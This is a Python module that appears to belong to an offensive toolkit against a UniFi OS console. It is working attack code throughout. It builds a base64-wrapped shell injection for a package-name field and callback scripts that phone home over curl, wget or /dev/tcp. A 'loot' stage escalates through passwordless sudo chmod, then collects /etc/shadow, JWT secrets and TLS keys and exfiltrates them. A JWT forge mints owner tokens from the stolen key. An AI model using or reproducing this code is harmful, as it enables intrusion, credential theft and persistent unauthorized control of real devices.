#!/usr/bin/env python3
"""NULLGATE payload construction.

Builds the shell scripts that are base64-wrapped into the ``pkg_name``
injection, plus the offline HS256 admin-token forge.

Nothing here reports success. A command is only ever considered executed when
the callback collector receives the matching nonce from the target.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json


def b64(text):
    if isinstance(text, str):
        text = text.encode("utf-8", "replace")
    return base64.b64encode(text).decode("ascii")


def b64decode(text):
    return base64.b64decode(text).decode("utf-8", "replace")


def injection_payload(script):
    """Wrap a shell script as the injected ``pkg_name`` value.

    The handler builds ``sudo systemctl stop <pkg_name>``; the leading
    ``evil;`` escapes the systemctl argument and our script runs via sh.
    Base64 keeps the script to one token so query encoding cannot corrupt it.
    """
    return "evil;echo %s|base64 -d|sh" % b64(script)


def _transport_block(base_url, host, port, nonce):
    """Shell fragment that calls home with curl, wget, or bash /dev/tcp.

    Tries each transport so it works on a stock Debian-based UniFi OS box even
    if one tool is missing. Never executed locally -- only staged for the target.
    """
    return """\
send_get() {
  U="%s/cb?n=%s&$1"
  command -v curl >/dev/null 2>&1 && curl -sS -m 6 "$U" >/dev/null 2>&1 && return 0
  command -v wget >/dev/null 2>&1 && wget -q -T 6 -O /dev/null "$U" >/dev/null 2>&1 && return 0
  bash -c 'exec 3<>/dev/tcp/%s/%s; printf "GET /cb?n=%s&$1 HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n" >&3' >/dev/null 2>&1 && return 0
  return 1
}
send_post() {
  U="%s/cb?n=%s&k=data"
  command -v curl >/dev/null 2>&1 && curl -sS -m 10 --data-binary "@$1" "$U" >/dev/null 2>&1 && return 0
  command -v wget >/dev/null 2>&1 && wget -q -T 10 --post-file="$1" -O /dev/null "$U" >/dev/null 2>&1 && return 0
  return 1
}
""" % (base_url, nonce, host, port, nonce, base_url, nonce)


def proof_script(nonce, host, port, marker="/tmp/.nullgate_proof"):
    """Stage-1 proof: write a marker on the target and call the Pager back.

    Confirmation is the callback itself, not the HTTP 200 from the injection.
    """
    base_url = "http://%s:%s" % (host, port)
    return """\
#!/bin/sh
echo "%s" > %s 2>/dev/null
%s
send_get "m=proof"
exit 0
""" % (nonce, marker, _transport_block(base_url, host, port, nonce))


def loot_script(nonce, host, port, extra_paths=None):
    """Stage-2: escalate with passwordless sudo chmod, collect secrets, exfil.

    The ``ucs-update`` service account may passwordlessly sudo /bin/chmod.
    We use that to make root-only files readable, copy the secret store, then
    POST a base64 tarball to the Pager's collector.
    """
    base_url = "http://%s:%s" % (host, port)
    paths = [
        "/etc/shadow",
        "/data/unifi-core/config/jwt.yaml",
        "/data/unifi-core/config/server.crt",
        "/data/unifi-core/config/server.key",
        "/data/unifi-core/config",
    ]
    for p in (extra_paths or []):
        if p and p not in paths:
            paths.append(p)
    chmod_lines = "\n".join(
        '  sudo -n chmod -R a+rX "%s" >/dev/null 2>&1 || true' % p for p in paths)
    return """\
#!/bin/sh
O=/tmp/.nullgate_out
D=/tmp/.nullgate_data
rm -rf "$O" "$D" 2>/dev/null
mkdir -p "$O" "$D" 2>/dev/null
for p in %s; do
  [ -e "$p" ] || continue
  sudo -n chmod -R a+rX "$p" >/dev/null 2>&1 || true
  cp -a "$p" "$D/" >/dev/null 2>&1 || true
done
( cd "$D" && tar -czf "$O/loot.tgz" . ) >/dev/null 2>&1
if [ -s "$O/loot.tgz" ]; then
  base64 -w0 "$O/loot.tgz" > "$O/loot.b64" 2>/dev/null || base64 "$O/loot.tgz" > "$O/loot.b64"
  %s
  send_post "$O/loot.b64"
fi
%s
send_get "m=loot"
exit 0
""" % (" ".join('"%s"' % p for p in paths), _transport_block(base_url, host, port, nonce),
       _transport_block(base_url, host, port, nonce))


def persist_probe_script(nonce, host, port, token):
    """Stage-3: use a forged owner token to hit an authenticated API endpoint.

    The callback fires only if the target accepted the token, which is real
    evidence of persistence rather than an assumed success.
    """
    base_url = "http://%s:%s" % (host, port)
    return """\
#!/bin/sh
%s
curl -fsS -m 8 -o /dev/null -H "Authorization: Bearer %s" \\
  https://127.0.0.1:11443/api/users/self >/dev/null 2>&1 && send_get "m=persist"
exit 0
""" % (_transport_block(base_url, host, port, nonce), token)


# --- HS256 token forge -------------------------------------------------------

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def jwt_decode(token):
    """Decode without verifying (for inspecting a captured template token)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a JWT")
    pad = "=" * (-len(parts[0]) % 4)
    header = json.loads(base64.urlsafe_b64decode(parts[0] + pad))
    pad = "=" * (-len(parts[1]) % 4)
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
    return header, payload


def forge_token(secret, template=None, claims=None, header=None):
    """Re-sign a captured template token with the stolen HS256 signing key.

    Bishop Fox confirmed verification does not pin alg/iss/aud, so a token
    derived offline from the stolen key works even on a patched console.
    ``template`` is a real token captured from the target; ``claims`` may
    override fields (e.g. role -> owner). Returns the forged token string.
    """
    if template:
        hdr, payload = jwt_decode(template)
    else:
        hdr = {"alg": "HS256", "typ": "JWT"}
        payload = {}
    if header:
        hdr.update(header)
    hdr["alg"] = "HS256"
    if claims:
        payload.update(claims)
    h = b64url(json.dumps(hdr, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = ("%s.%s" % (h, p)).encode("ascii")
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    sig = b64url(hmac.new(secret, signing_input, hashlib.sha256).digest())
    return "%s.%s.%s" % (h, p, sig)


def read_jwt_secret(text):
    """Pull the ``secret:`` value out of a jwt.yaml file dumped from the target."""
    for line in (text or "").splitlines():
        s = line.strip()
        if s.startswith("secret:"):
            return s.split(":", 1)[1].strip().strip("'\"")
    return ""
